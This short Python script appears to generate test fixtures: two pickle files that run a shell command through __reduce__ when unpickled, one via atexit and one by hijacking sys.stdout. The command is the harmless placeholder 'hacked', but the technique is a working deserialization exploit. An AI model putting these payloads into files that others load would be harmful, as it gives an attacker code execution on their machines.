import atexit
import os
import pickle
from pathlib import Path


class AtExit:
    def __reduce__(self):
        return (atexit.register, (os.system, ("hacked")))


print_payload = """
import sys

class Pwn:
    @staticmethod
    def write(*args, **kwargs):
        import os
        os.system('hacked')

s = sys.stdout
sys.stdout = Pwn()
try:
    print()
finally:
    sys.stdout = s
"""


class Print:
    def __reduce__(self):
        return (exec, (print_payload,))


pickles = [
    ("atexit", AtExit()),
    ("print", Print()),
]

for name, obj in pickles:
    Path(f"/tmp/{name}.pickle").write_bytes(pickle.dumps(obj))
